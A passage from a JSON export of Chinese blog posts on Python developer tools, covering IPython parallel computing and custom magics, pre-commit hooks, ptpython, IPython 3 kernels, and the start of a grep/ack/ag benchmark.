这里没autopx的话 需要: `%px import os`\n\nIn [6]: print os.getpid() # 2个进程的pid\n[stdout:0] 62638\n[stdout:1] 62636\n\nIn [7]: %pxconfig --targets 1 # 在autopx下 这个magic不可用\n[stderr:0] ERROR: Line magic function `%pxconfig` not found.\n[stderr:1] ERROR: Line magic function `%pxconfig` not found.\n\nIn [8]: %autopx # 再执行一次就会关闭autopx\n%autopx disabled\n\nIn [10]: %pxconfig --targets 1 # 指定目标对象, 这样下面执行的代码就会只在第2个进程下运行\n\nIn [11]: %%px --noblock # 其实就是执行一段非阻塞的代码\n   ....: import time\n   ....: time.sleep(1)\n   ....: os.getpid()\n   ....:\nOut[11]: <AsyncResult: execute>\n\nIn [12]: %pxresult # 看 只返回了第二个进程的pid\nOut[1:21]: 62636\n\nIn [13]: v = rc[:] # 使用全部的进程, ipython可以细粒度的控制那个engine执行的内容\n\nIn [14]: with v.sync_imports(): # 每个进程都导入time模块\n   ....:     import time\n   ....:\nimporting time on engine(s)\n\nIn [15]: def f(x):\n   ....:     time.sleep(1)\n   ....:     return x * x\n   ....:\n\nIn [16]: v.map_sync(f, range(10)) # 同步的执行\n\nOut[16]: [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n\nIn [17]: r = v.map(f, range(10)) # 异步的执行\n\nIn [18]: r.ready(), r.elapsed # celery的用法\nOut[18]: (True, 5.87735)\n\nIn [19]: r.get() # 获得执行的结果\nOut[19]: [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n```\n\n入正题:\n\n```python\nIn [20]: def split_text(filename):\n....:    text = open(filename).read()\n....:    lines = text.splitlines()\n....:    nlines = len(lines)\n....:    n = 10\n....:    block = nlines//n\n....:    for i in range(n):\n....:        chunk = lines[i*block:(i+1)*(block)]\n....:        with open('count_file%i.txt' % i, 'w') as f:\n....:            f.write('\\n'.join(chunk))\n....:    cwd = os.path.abspath(os.getcwd())\n....:    fnames = [ os.path.join(cwd, 'count_file%i.txt' % i) for i in range(n)] # 不用glob是为了精准\n....:    return fnames\n\nIn [21]: from IPython import parallel\n\nIn [22]: rc = parallel.Client()\n\nIn [23]: view = rc.load_balanced_view()\n\nIn [24]: v = rc[:]\n\nIn [25]: v.push(dict(\n   ....:     non_word=non_word,\n   ....:     yield_words=yield_words,\n   ....:     common_words=common_words\n   ....: ))\nOut[25]: <AsyncResult: _push>\n\nIn [26]: fnames = split_text(filename)\n\nIn [27]: def count_parallel():\n   .....:     pcounts = view.map(word_count, fnames)\n   .....:     counts = defaultdict(int)\n   .....:     for pcount in pcounts.get():\n   .....:         for k, v in pcount.iteritems():\n   .....:             counts[k] += v\n   .....:     return counts, pcounts\n   .....:\n\nIn [28]: %time counts, pcounts = count_parallel() # 这个时间包含了我再聚合的时间\nCPU times: user 47.6 ms, sys: 6.67 ms, total: 54.3 ms # 是不是比直接运行少了很多时间?\nWall time: 106 ms # 这个时间是\n\nIn [29]: pcounts.elapsed, pcounts.serial_time, pcounts.wall_time\nOut[29]: (0.104384, 0.13980499999999998, 0.104384)\n```\n\n更多地关于并行计算请看这里: [Parallel Computing with IPython](http://nbviewer.ipython.org/url/www.astro.washington.edu/users/vanderplas/Astr599/notebooks/21_IPythonParallel.ipynb)\n",
    "date": {
      "year": "2014",
      "month": "December",
      "day": "07"
    }
  },
  {
    "id": 299,
    "title": "ipython的一些高级用法(二)",
    "category": "python",
    "tags": [
      "python",
      "ipython"
    ],
    "url": "/archives/ipythonde-%5B%3F%5D-xie-gao-ji-yong-fa-er/",
    "content": "#### 今天我们学习下写ipython的magic命令. 好, magic是什么? 它是ipython自带的一些扩展命令, 类似%history, %prun, %logstart..\n想查看全部的magic可以使用ismagic, 列出可用的全部magics\n\n```python\n%lsmagic\n```\n\nmagic分为2类:\n\n- line magic: 一些功能命令\n- cell magic: 主要是渲染ipython notebook页面效果以及执行某语言的代码\n\n##### [idb](https://github.com/dongweiming/idb) - python db.py shell extension\n\nidb是我最近写的一个magic. 主要是给ipython提供[db.py](https://github.com/yhat/db.py)的接口,我们直接分析代码(我只截取有代表性的一段):\n\n```python\nimport os.path\nfrom functools import wraps\nfrom operator import attrgetter\nfrom urlparse import urlparse\n\nfrom db import DB # db.py提供的接口\nfrom IPython.core.magic import Magics, magics_class, line_magic # 这三个就是我们需要做magic插件的组件\n\n\ndef get_or_none(attr):\n    return attr if attr else None\n\n\ndef check_db(func):\n    @wraps(func)\n    def deco(*args):\n        if args[0]._db is None: # 每个magic都需要首页实例化过db，so 直接加装饰器来判断\n            print '[ERROR]Please make connection: `con = %db_connect xx` or `%use_credentials xx` first!'  # noqa\n            return\n        return func(*args)\n    return deco\n\n\n@magics_class  # 每个magic都需要加这个magics_class装饰器\nclass SQLDB(Magics): # 要继承至Magics\n    _db = None # 每次打开ipython都是一次实例化\n\n    @line_magic('db_connect') # 这里用了line_magic 表示它是一个line magic.(其他2种一会再说) magic的名字是db_connect. 注意 函数名不重要\n                              # 最后我们用 %db_connect而不是%conn\n    def conn(self, parameter_s): # 每个这样的方法都接收一个参数 就是你在ipython里输入的内容\n        \"\"\"Conenct to database in ipython shell.\n        Examples::\n            %db_connect\n            %db_connect postgresql://user:pass@localhost:port/database\n        \"\"\"\n        uri = urlparse(parameter_s) # 剩下的都是解析parameter_s的逻辑\n\n        if not uri.scheme:\n            params = {\n                'dbtype': 'sqlite',\n                'filename': os.path.join(os.path.expanduser('~'), 'db.sqlite')\n            }\n        elif uri.scheme == 'sqlite':\n            params = {\n                'dbtype': 'sqlite',\n                'filename': uri.path\n            }\n        else:\n            params = {\n                'username': get_or_none(uri.username),\n                'password': get_or_none(uri.password),\n                'hostname': get_or_none(uri.hostname),\n                'port': get_or_none(uri.port),\n                'dbname': get_or_none(uri.path[1:])\n            }\n\n        self._db = DB(**params) # 这里给_db赋值\n\n        return self._db # return的结果就会被ipython接收,显示出来\n\n    @line_magic('db') # 一个新的magic 叫做%db -- 谨防取名冲突\n    def db(self, parameter_s):\n        return self._db\n\n    @line_magic('table')\n    @check_db\n    def table(self, parameter_s):\n        p = parameter_s.split() # 可能传进来的是多个参数,但是对ipython来说,传进来的就是一堆字符串，所以需要按空格分隔下\n        l = len(p)\n        if l == 1:\n            if not p[0]:\n                return self._db.tables\n            else:\n                return attrgetter(p[0])(self._db.tables)\n        else:\n            data = self._db.tables\n            for c in p:\n                if c in ['head', 'sample', 'unique', 'count', 'all', 'query']:\n                    data = attrgetter(c)(data)()\n                else:\n                    data = attrgetter(c)(data)\n            return data\n\ndef load_ipython_extension(ipython): # 注册一下. 假如你直接去ipython里面加 就不需要这个了\n    ipython.register_magics(SQLDB)\n```\n\nPS:\n\n1. 调试中可以使用%reloa_ext idb 的方式重启magic\n2. %install_ext 之后默认放在你的ipython自定义目录/extensions里. 我这里是~/.ipython/extensions\n\n好了,大家是不是觉得ipython的magic也不是很难嘛\n\n##### 来了解ipython都提供了什么?\n\n1. magic装饰器的类型:\n\n- line_magic # 刚才我们见识了, 就是%xx, xx就是magic的名字\n- cell_magic # 就是%%xx\n- line_cell_magic # 可以是%xx, 也可以是%%xx\n\n先说cell_magic 来个例子，假如我想执行个ruby,本来应该是:\n\n```python\nIn [1]: !ruby -e 'p \"hello\"'\n\"hello\"\n\nIn [2]: %%ruby # 也可以这样\n   ...: p \"hello\"\n      ...:\n      \"hello\"\n\n再说个notebook的:\n\nIn [3]: %%javascript\n   ...: require.config({\n   ...:     paths: {\n   ...:         chartjs: '//code.highcharts.com/highcharts'\n   ...:     }\n   ...: });\n   ...:\n   <IPython.core.display.Javascript object>\n});\n```\n\n然后再说line_cell_magic:\n\n```python\nIn [4]: %time 2**128\nCPU times: user 2 µs, sys: 1 µs, total: 3 µs\nWall time: 5.01 µs\nOut[4]: 340282366920938463463374607431768211456L\n\nIn [5]: %%time\n   ...: 2**128\n   ...:\n   CPU times: user 4 µs, sys: 0 ns, total: 4 µs\n   Wall time: 9.06 µs\n   Out[5]: 340282366920938463463374607431768211456L\n```\n\nPs: line_cell_magic方法的参数是2个:\n\n```python\n@line_cell_magic\ndef xx(self, line='', cell=None):\n```\n\n##### 带参数的magic（我直接拿ipython源码提供的magic来说明):\n\n一共2种风格:\n\n- 使用getopt: self.parse_options\n- 使用argparse: magic_arguments\n\n###### self.parse_options\n\n```python\n@line_cell_magic\ndef prun(self, parameter_s='', cell=None):\n    opts, arg_str = self.parse_options(parameter_s, 'D:l:rs:T:q',\n                                       list_all=True, posix=False)\n    ...\n```\n\ngetopt用法可以看这里 http://pymotw.com/2/getopt/index.html#module-getopt\n\n我简单介绍下'D:l:rs:T:q'就是可以使用 -D, -l, -r, -s, -T, -q这些选项. `:`号是告诉你是否需要参数,split下就是:\nD:,l:,r,s:,T:,q 也就是-r和-q不需要参数其他的都是参数 类似 %prun -D <filename>\n\n###### magic_arguments\n\n```python\n@magic_arguments.magic_arguments() # 最上面\n@magic_arguments.argument('--breakpoint', '-b', metavar='FILE:LINE',\n    help=\"\"\"\n    Set break point at LINE in FILE.\n    \"\"\"\n) # 这种argument可以有多个\n@magic_arguments.argument('statement', nargs='*',\n    help=\"\"\"\n    Code to run in debugger.\n    You can omit this in cell magic mode.\n    \"\"\"\n)\n@line_cell_magic\ndef debug(self, line='', cell=None):\n    args = magic_arguments.parse_argstring(self.debug, line) # 要保持第一个参数等于这个方法名字,这里就是self.debug\n    ...\n```\n\n还有个magic方法集: 用于并行计算的magics: [IPython/parallel/client/magics.py](https://github.com/ipython/ipython/blob/master/IPython/parallel/client/magics.py)\n",
    "date": {
      "year": "2014",
      "month": "December",
      "day": "11"
    }
  },
  {
    "id": 300,
    "title": "推荐pre-commit/pre-push: 本地在commit或者push的时候做各种检查(pep8/pylint/pyflakes8)",
    "category": "pre-commit",
    "tags": [
      "pre-commit",
      "pre-push"
    ],
    "url": "/archives/tui-jian-pre-commit-slash-pre-push-ben-di-zai-commithuo-zhe-pushde-shi-hou-zuo-ge-chong-jian-cha-pep8-slash-pylint-slash-pyflakes8/",
    "content": "#### 前言\n\n使用git的同学想必都有这样的工作场景-保证生产环境的ci不挂. 也就是检查python是否符合pep8/csslint/jslint/pylint/pyflake8等.\n我在我的emacs配置中加入了这一项[py-autopep8](https://github.com/dongweiming/emacs.d/blob/master/custom/py-autopep8.el),\n就是在保存缓存区的时候把当前缓存区的文本放到一个临时文件, 然后执行autopep8, 再检查pep8/flake8\n\n\n但是不能对css/js/html做规范检查. 而且也不通用. 周末看到了Yelp的[pre-commit](https://github.com/pre-commit/pre-commit).\n感觉是个很有意思的东西，虽然之前也写过类似的hook. 但是没有它灵活. 看完他的源码后, 我今天给大家介绍下这个东西\n\n#### pre-commit\n\n玩过svn/git的同学应该都知道他们有各种的hook. 也就是准备/完成什么事件的时候做些额外的工作. 一般是shell脚本,\n版本控制工具会判断脚本的退出码, 如果不是0, 就不会继续完成. pre-commit顾名思义就是在commit之前做的准备, 也就是每次执行\n\n```\ngit commit -m 'xxx'\n```\n\n的时候去做一些检查. 启用的插件都放到这个版本库目录的根目录下, 名字叫做.pre-commit-config.yaml -> 详细文档请看: [http://pre-commit.com/](http://pre-commit.com/)\n\n\n这里有我的一个配置例子:\n\n```python\n-   repo: https://github.com/pre-commit/pre-commit-hooks\n    sha: b03733bc86d9e8b2564a5798ade40d64baae3055\n    hooks:\n    -   id: trailing-whitespace\n    -   id: end-of-file-fixer\n    -   id: autopep8-wrapper\n    args: ['-i', '--ignore=E265,E309,E501']\n    -   id: check-docstring-first\n    -   id: check-json\n    -   id: check-yaml\n    -   id: debug-statements\n    -   id: name-tests-test\n    -   id: requirements-txt-fixer\n    -   id: flake8\n-   repo: https://github.com/pre-commit/pre-commit\n    sha: 86c99c6b870a261d2aff0b4cdb36995764edce1b\n    hooks:\n    -   id: validate_config\n    -   id: validate_manifest\n-   repo: https://github.com/asottile/reorder_python_imports\n    sha: ea9fa14a757bb210d849de5af8f8ba2c9744027a\n    hooks:\n    -   id: reorder-python-imports\n```\n\n#### 安装使用\n\n```python\npip install pre-commit\npre-commit install\n# PS: 第一次执行commit会比较慢，因为他会clone对应的源, 之后就会用这个缓存的源\n# 其他的可选源和用法直接参照[https://github.com/pre-commit](https://github.com/pre-commit)里面的项目或者[http://pre-commit.com/hooks.html](http://pre-commit.com/hooks.html)\n```\n\n####  看一个失败的例子(有颜色效果, 不能展示出来)\n\n```python\n$git commit -m 'test'\n\nTrim Trailing Whitespace.................................................................................................................Passed\nFix End of Files.........................................................................................................................Passed\nautopep8 wrapper.........................................................................................................................Passed\nCheck docstring is first.................................................................................................................Passed\nCheck JSON..........................................................................................................(no files to check) Skipped\nCheck Yaml..........................................................................................................(no files to check) Skipped\nDebug Statements (Python)................................................................................................................Passed\nTests should end in _test.py........................................................................................(no files to check) Skipped\nFix requirements.txt................................................................................................(no files to check) Skipped\nFlake8...................................................................................................................................Failed\nhookid: flake8\n\npre_commit/__init__.py:2:1: F401 'os' imported but unused\npre_commit/__init__.py:3:1: F401 'sys' imported but unused\n\nValidate Pre-Commit Config..........................................................................................(no files to check) Skipped\nValidate Pre-Commit Manifest........................................................................................(no files to check) Skipped\nReorder python imports...................................................................................................................Passed\n# 因为我的flake8有问题 所以commit失败了\n```\n\n#### pre-commit的问题\n\n我觉得对每次commit做一次审查, 第一是需要时间, 第二是没有必要, 因为经常一个pr有多个commit,\n我只保证整体结果是正确的就好了 - 也就是说应该是在push的时候. 整个过程我可能对commit做多次rebase/--amend等等. 某一次的检查失败其实完全不\n影响我做后的结果 - 我是手快党\n\nso. 我基于它修改了一个版本[pre-push](https://github.com/dongweiming/pre-push/), 只是我对push做了拦截. 并且我会经常和它保持同步\n\n```python\npre-commit install -t pre-commit # 默认安装pre-commit钩子, 每次commit触发\npre-commit install -t pre-push # 默认安装pre-push钩子, 每次push触发\n```\n\n其他用法完全一样.\n\n假如push的时候想要不检查而强制push, 可以加上`--no-verify`参数\n\n\n#### Update from 2015-01-15\n\n我的这个分支已经合并到[pre-commit](https://github.com/pre-commit/pre-commit). [pull189](https://github.com/pre-commit/pre-commit/pull/189)\n\n大家可以不要用我的分支了. PS: 这是我见到测试覆盖最高的项目.\n",
    "date": {
      "year": "2015",
      "month": "January",
      "day": "12"
    }
  },
  {
    "id": 301,
    "title": "分享ipython notebook",
    "category": "ipython",
    "tags": [
      "ipython",
      "ipython notebook",
      "ipynb"
    ],
    "url": "/archives/ji-jiang-zai-bpugfen-xiang/",
    "content": "#### 前言\n\n本来准备下一次的Bpug(北京python用户组)的活动上准备做这个分享. 搁置了. 有兴趣组织纯技术活动的公司或者组织可以联系我. 有兴趣的同学可以前往(我也会把录像地址放到网站的).\n提前给大家做一些预告. 其实ppt早就放到slideshare上了, 地址是http://www.slideshare.net/dongweiming/ipython-notebook-43211257. 也可以从[github下载](https://github.com/dongweiming/divingintoipynb/blob/master/ipython-notebook.pdf)\n\n对应的代码在[divingintoipynb](https://github.com/dongweiming/divingintoipynb). Youtube在线看: [https://www.youtube.com/watch?v=qMcKp8gFAYA](https://www.youtube.com/watch?v=qMcKp8gFAYA)\n\n#### 大纲\n\n1. 豆瓣东西双11临时后台 - 想看效果么? 看下面\n2. 把ipython notebook转换成html或者其他格式以及它的原理\n3. 我写的一个缩小版的[nbviewer](https://github.com/jupyter/nbviewer): [Ipynb-viewer](https://github.com/dongweiming/Ipynb-viewer), 直接在ipython目录启动web服务\n4. nbconvert原理\n5. 用ipynb写blog(pelican/nikola) 效果可见[divingintoipynb_pelican](http://dongweiming.github.io/divingintoipynb_pelican)和[divingintoipynb_nikola](http://dongweiming.github.io/divingintoipynb_nikola/)\n   还会讲到pelican转换ipynb到html插件，使用fabric: new_post, edit，import_ipynb. 我也给nikola贡献了import ipynb功能.\n6. ipython notebook用到得第三方库和组件\n7. Rich display system\n7. 现有的扩展, 演示. 我自己写的一个扩展. 演示, 代码分析\n8. 定制ipython notebook的键位. 使用emacs键位. 设计一个新的功能 - 弹出一个dialog列出所有emacs快捷键说明(想起来了么? C-h b)\n9. 定制一个基于[selectize.js](https://github.com/brianreavis/selectize.js)的widget. 前后端代码分析.\n10. ipython notebook 其他方面的一些用法， 整个过程中有ipython2也有ipython3\n\n\n模拟后台效果:\n\n![](https://github.com/dongweiming/divingintoipynb/raw/master/double11/double11.png)\n\n\n### UPDATE: 2015-02-02\n\n上周五在组内分享了, 下面是视频下载地址: [http://pan.baidu.com/s/1o6BjBXg](http://pan.baidu.com/s/1o6BjBXg)\n",
    "date": {
      "year": "2015",
      "month": "January",
      "day": "16"
    }
  },
  {
    "id": 302,
    "title": "ptpython- a better Python REPL",
    "category": "ptpython",
    "tags": [
      "ptpython",
      "ptipython",
      "ipython"
    ],
    "url": "/archives/ptpython-a-better-python-repl/",
    "content": "#### 前言\n\n今天发现一个项目: [ptpython](https://github.com/jonathanslenders/ptpython). 新一代的REPL神器. 玩了一下. 毅然的ipython换成了ptipython - ptpython自带的\niython的接口. 和大家介绍下\n\n#### ptpython的优点\n\n先说几个在用ipython过程中遇到的问题吧.\n\n1. ipython在Mac下缩进问题. 每次在交互模式里面输入一个缩进的内容, 比如下面\n\n```python\nIn [1]: def t():\n   ...:     return 1\n      ...:\n\nIn [2]: def t():\n    return 1\n```\n\n看到了吧, 缩进不正确了. ptpython没有这个问题, 它的底层库[prompt_toolkit](https://github.com/jonathanslenders/python-prompt-toolkit)实现了一个替代物\n\n2. jedi. 我在emacs里面, jedi是标配. 其一是因为有epc, 可以和python通信, 它的自动补全和跳到函数/类定义真的很方便. 但是python交互解释器\n还没有一个用它的. 这里真的感觉效果很好.\n\n3. emacs/vim键位. 好吧我经常在用ipython的时候习惯`Ctrl+x Ctrl+c`退出. 能用emacs的键位做编辑真的很爽\n4. 提供一个终端的菜单, 有多个选项可以选择\n5. 模式粘贴. 大家知道python有个问题: 你粘贴过来的代码不一定能运行 - 粘贴后的缩进会很奇怪的. ipython虽然有`%paste`和`%cpaste`. 但是有时候还是会有`IndentationError`问题.\nptpython在这里独创了`Paste mode`. 使用F7切换. 还可以多行编辑.\n6. 可以开启多个Tab,甚至多个Tab的内容一齐显示出来. 类似vim的:split\n7. 能对你写的每行程序判断是否出现语法错误.如果你的代码有问题, 下面左侧会有错误提示 - 这其实能延伸做很多检查嘛\n8. ipython对查看对象的方法有一些问题, 比如这个:\n\n```python\n$ipython\nIn [1]: '/tmp'.<tab> # 不会理你的\n```\n\nptpython对这样的处理都很好\n\n9. 一个很贴心的特性:\n\n```python\n$ptpython\nIn [1]: 'tmp<Tab> # 他会告诉你这是个目录, 还会自动完成列出目录下的文件. autocompletion\n```\n\n10. 最后一点吧. 它非常容易的被嵌入你的程序，你的解释器\n\n```python\npython\nPython 2.7.3 (default, Apr 10 2013, 06:20:15)\n[GCC 4.6.3] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\nWelcome to Lazy Python.  Type \"help LazyPython\" for help.\n>>> from ptpython.repl import embed\n>>> embed(globals(), locals(), vi_mode=False, history_filename=None)\nIn [1]: # 看就这么2句\n```\n\n#### ptipython\n\nptipython = ptpython + ipython\n\n在安装了ptipython之后, 就可以使用了. 完全可以替代ipython. 类似[bipython](https://github.com/ivanov/bipython) = bpython + ipython\n",
    "date": {
      "year": "2015",
      "month": "January",
      "day": "26"
    }
  },
  {
    "id": 303,
    "title": "IPython3时代到来",
    "category": "ipython",
    "tags": [
      "ipython"
    ],
    "url": "/archives/ipython3shi-dai-dao-lai/",
    "content": "#### 前言\n\n我以前写过一些[IPython高级用法](http://www.dongwm.com/blog/categories/ipython/), 还有在组内分享了一期[IPython notebook的分享](http://www.dongwm.com/archives/ji-jiang-zai-bpugfen-xiang/). 今天[IPython3](https://github.com/ipython/ipython)被release了. 它带来什么可以看一下[release notes](http://ipython.org/ipython-doc/3/whatsnew/version3.html).\n好吧, 我也没有意识到ipython3来的会这样快. 这多半年来. 我作为一个150个贡献者之一, 见证了IPython的发展. 这是个里程碑的版本. 他带来了非常多的变化和新的特性. 今天我来帮大家迁移和解读一些吧.\n\nIPython是什么? 本质上它是一个增强版的python交互模式解释器, 所见即所得的执行代码, 查看结果, 也拥有历史记录. 我认为这是一个python开发者必备的工具. 我个人依赖ipython常用的功能有:\n\n\n* ipython notebook - 一个可以跑的在线可编辑可运行的笔记. 可以测试程序, 执行代码, 当做说明文档, 能帮助不擅长web开发的同学做出很多页面的效果, 支持markdown语法等\n* 自动补全 - 当我`import xx`的时候 我可以像用zsh一样使用Tab自动补全对应的模块/方法的名字\n* magic - 它提供很很多magic的函数命令, 比如你可以直接执行ls, pwd等. 还能使用其他shell命令, 调用编辑器等\n* 它能通过?或者??帮我查看代码的注释, 接口参数等等.\n* 它提供很多的配置选择, 可以使用内置/外部插件达到一些其他的功能, 比如autoreload - 你不需要退出ipython就能获得你已经import之后的代码修改后的效果.\n* 它在分布计算, 数据分析上又很好的支持, ipython非常大的使用群体是科学家和算法工程师\n\n\n它在python界有什么地位? 我肯定会带有个人色彩. 来一些github的数据说一说(截止到2015-03-01之前):\n\n\n| 项目 | Issue数 | Star数 |\n| ------------- |:-------------:| -----:|\n| django | 4221 | 13088 |\n| flask | 1359 | 12810 |\n| tornado | 1352 | 8626 |\n| ipython | 7898 | 5822 |\n\n\n这是python最有名的几个项目. 可以看到ipython的star远落后于其他. 但是他的issue数却大大的高于其他, 一方面IPython覆盖的功能和逻辑更多更复杂.\n一方面用户对IPython的依赖和兴趣要高很多, 还有一方面IPython也由于内容太多更容易有bug,且主要维护者都是科学家没有太多精力和兴趣做一些基础保障.\n可见IPython的知名度不高, 但是对用户粘性却很高.\n\n#### 如何升级\n\n假如你需要使用ipython notebook, 需要使用\n\n```python\npip install --upgrade \"ipython[all]\"\n```\n\n否则直接\n\n```python\npip install --upgrade ipython\n```\n\n#### 使用不同的内核(kernel)\n\nIPython的组件大多是核心开发者开发的, <release notes>中提到了kernel是这样几个:\n\n```python\nBash\nEcho\nPython2\nPython3\nR\n```\n\nBash是这个项目[https://github.com/takluyver/bash_kernel/](https://github.com/takluyver/bash_kernel/), 你可以直接\n\n```python\nsudo pip install bash_kernel\n```\n\n那么开始说kernel是什么, kernel是一个能执行各种语言的程序封装, 比如可以用notebook跑bash, 跑ruby, 能使用其他语言的语法.\n上面的bash就是借用pexpect的[replwrap](http://pexpect.readthedocs.org/en/latest/api/replwrap.html)实现的bash的封装.对比一下就知道了:\n\n```python\n$/usr/local/bin/ipython\nIn [1]: echo\n---------------------------------------------------------------------------\nNameError                                 Traceback (most recent call last)\n<ipython-input-1-53f31a089339> in <module>()\n----> 1 echo\n\nNameError: name 'echo' is not defined\nIn [2]: bc\n---------------------------------------------------------------------------\nNameError                                 Traceback (most recent call last)\n<ipython-input-2-b79898bb7907> in <module>()\n----> 1 bc\n\nNameError: name 'bc' is not defined\n$/usr/local/bin/ipython console --kernel bash # 使用bash内核就可以使用这些bash下命令了\nIPython Console 3.0.0\n\nIn [1]: echo '2-1'\n2-1\n\nIn [2]: echo '2-1'|bc\n1\n```\n\n看一下我本地都能用什么kernel:\n\n```python\n$ipython kernelspec list\nAvailable kernels:\npython2\npython3\nbash\necho\n```\n\npython2就是系统默认的, 原来用的那个. 看到echo和python3的原因在这里:\n\n\n```python\n$pwd\n/Users/dongweiming/.ipython/kernels\n$tree\n.\n├── echo # 在~/.ipython/kernels有这个echo的目录里面包含了正确地kernel.json就会出现对应的kernel\n│   └── kernel.json\n├── echokernel.py\n└── python3\n    └── kernel.json\n\n2 directories, 3 files\n```\n\n看一下代码:\n\n```\n$cat echo/kernel.json\n{\"argv\":[\"python\",\"-m\",\"echokernel\", \"-f\", \"{connection_file}\"],\n \"display_name\":\"Echo\"\n }\n\n$cat python3/kernel.json\n{\n  \"display_name\": \"IPython (Python 3)\",\n  \"language\": \"python\",\n  \"argv\": [\n    \"python3\",\n    \"-c\", \"from IPython.kernel.zmq.kernelapp import main; main()\",\n    \"-f\", \"{connection_file}\"\n    ],\n  \"codemirror_mode\": {\n    \"version\": 2,\n    \"name\": \"ipython\"\n    }\n}\n$ipython console --kernel python3 # 可以在python2下跑python3的代码了\nIn [1]: print\nOut[1]: <function print>\n\nIn [2]: print 'sd'\n  File \"<ipython-input-2-f747b7d9e029>\", line 1\n      print 'sd'\n      ^\nSyntaxError: invalid syntax\n```\n\n更多的自定义请看[Wrapper kernels](http://ipython.org/ipython-doc/3/development/wrapperkernels.html)\n\n当然这里默认都可以在notebook里使用\n\n#### Widget\n\nwidget系统经过了很大的重构和更新, 全部信息在[widget migration guide](http://ipython.org/ipython-doc/3/whatsnew/version3_widget_migration.html).\n\nWidget是什么? 这是ipython notebook的插件系统, 大部分的插件都可以看这里: [containers_widgets.ipynb](http://nbviewer.ipython.org/github/dongweiming/divingintoipynb/blob/master/double11/containers_widgets.ipynb), 看完就知道它是什么和它能做什么了.\n在我分享notebook的项目[divingintoipynb](https://github.com/dongweiming/divingintoipynb)里你能看到我自定义的widget:\n[selectize_widget.ipynb](https://github.com/dongweiming/divingintoipynb/blob/master/double11/selectize_widget.ipynb), 和对应的[widget_selectize.py](https://github.com/dongweiming/divingintoipynb/blob/master/double11/widget_selectize.py).\n\ncustom.js在使用的时候也有了很大的变动, 可以看我分享项目的[custom.js](https://github.com/dongweiming/divingintoipynb/blob/master/profile_double11/static/custom/custom.js)\n\n#### Notebook format\n\n原来的Notebook的版本是3, 现在已经升级为4. 他们是不兼容的版本. 在启动新版IPython访问你的ipynb的时候会出现这样的弹出框:\n\n```python\nThis notebook has been converted from an older notebook format (v3) to the current notebook format (v4). The next time you save this notebook, the current notebook format will be used. Older versions of IPython may not be able to read the new format. To preserve the original version, close the notebook without saving it.\n```\n\n你记得保存一下会帮你自动转化为新版本, 下次再启动就可以. 假如由于bug或者其他原因想降级可以这样:\n\n```python\nipython nbconvert --to notebook --nbformat 3 <notebook>\n```\n\n#### 使用jinja2自定义模板\n\n通过`NotebookApp.extra_template_paths`可以指定外部模板目录, 可以代替默认模板. 或者:\n\n```python\nipython notebook '--extra_template_paths=[\"/Users/dongweiming/.ipython/templates/\"]'\n```\n\n比如你不喜欢ipython notebook提供的现有的目录页(http://localhost:8000/tree这样的路径). 你可以自己写一个叫做tree.html.的模板放在\n/Users/dongweiming/.ipython/templates/目录下. 但是建议还是继承原来的tree.html, 再自由发挥.\n\n#### 使用ipython notebook的terminal功能.\n\n在notebook页面上其实是可以直接使用websocket连接到服务器上的. 但是你需要安装`terminado`. 这样在/tree下新建的时候就能选择terminal了.\n\n#### 其他\n\n剩下就是一些bug修改, 方法重命名, 功能增强, 去掉一些不再被维护的内容等等. 对95%的用户影响几乎没有.\n",
    "date": {
      "year": "2015",
      "month": "February",
      "day": "28"
    }
  },
  {
    "id": 304,
    "title": "grep, ack, ag的搜索效率对比",
    "category": "linux",
    "tags": [
      "linux",
      "grep",
      "ack",
      "ag"
    ],
    "url": "/archives/ack/",
    "content": "#### 前言\n\n我经常看到很多程序员, 运维在代码搜索上使用ack, 甚至ag(the_silver_searcher\n), 而我工作中95%都是用grep,剩下的是ag. 我觉得很有必要聊一聊这个话题.\n我以前也是一个运维, 我当时也希望找到最好的最快的工具用在工作的方方面面. 但是我很好奇为什么ag和ack没有作为linux发行版的内置部分.\n内置的一直是grep. 我当初的理解是受各种开源协议的限制, 或者发行版的boss个人喜好. 后来我就做了实验, 研究了下他们到底谁快. 当时的做法也无非跑几个真实地线上log看看用时. 然后我也有了我的一个认识: 大部分时候用grep也无妨, 日志很大的时候用ag.\n\nack原来的域名是betterthangrep.com, 现在是beyondgrep.com. 好吧. 其实我理解使用ack的同学, 也理解ack产生的原因. 这里就有个故事.\n\n最开始我做运维使用shell, 经常做一些分析日志的工作. 那时候经常写比较复杂的shell代码实现一些特定的需求. 后来来了一位会perl的同学. 原来我写shell做一个事情, 写了20多行shell代码, 跑一次大概5分钟, 这位同学来了用perl改写, 4行, 一分钟就能跑完. 亮瞎我们的眼, 从那时候开始, 我就觉得需要学perl,以至于后来的python.\n\nperl是天生用来文本解析的语言, ack的效率确实很高. 我想着可能是大家认为ack要更快更合适的理由吧. 其实这件事要看场景. 我为什么还用比较'土'的grep呢? 看一下这篇文章, 希望给大家点启示\n\n#### 实验条件\n\nPS: 严重声明, 本实验经个人实践, 我尽量做到合理. 大家看完觉得有异议可以试着其他的角度来做. 并和我讨论.\n\n* 我使用了公司的一台开发机(gentoo)\n\n* 我测试了纯英文和汉语2种， 汉语使用了[结巴分词](https://github.com/fxsjy/jieba)的字典, 英语使用了`miscfiles`中提供的词典\n\n```python\n# 假如你是ubuntu: sudo apt-get install miscfiles\nwget https://raw.githubusercontent.com/fxsjy/jieba/master/extra_dict/dict.txt.big\n```\n\n#### 实验前的准备\n\n我会分成英语和汉语2种文件, 文件大小为1MB, 10MB, 100MB, 500MB, 1GB, 5GB. 没有更多是我觉得在实际业务里面不会单个日志文件过大的. 也就没有必要测试了(就算有, 可以看下面结果的趋势)\n\n\n```python\ncat make_words.py\n# coding=utf-8\n\nimport os\nimport random\nfrom cStringIO import StringIO\n\nEN_WORD_FILE = '/usr/share/dict/words'\nCN_WORD_FILE = 'dict.txt.big'\nwith open(EN_WORD_FILE) as f:\n    EN_DATA = f.readlines()\nwith open(CN_WORD_FILE) as f:\n    CN_DATA = f.readlines()\nMB = pow(1024, 2)\nSIZE_LIST = [1, 10, 100, 500, 1024, 1024 * 5]\nEN_RESULT_FORMAT = 'text_{0}_en_MB.txt'\nCN_RESULT_FORMAT = 'text_{0}_cn_MB.txt'\n\n\ndef write_data(f, size, data, cn=False):\n    total_size = 0\n    while 1:\n        s = StringIO()\n        for x in range(10000):\n            cho = random.choice(data)\n            cho = cho.split()[0] if cn else cho.strip()\n            s.write(cho)\n        s.seek(0, os.SEEK_END)\n        total_size += s.tell()\n        contents = s.getvalue()\n 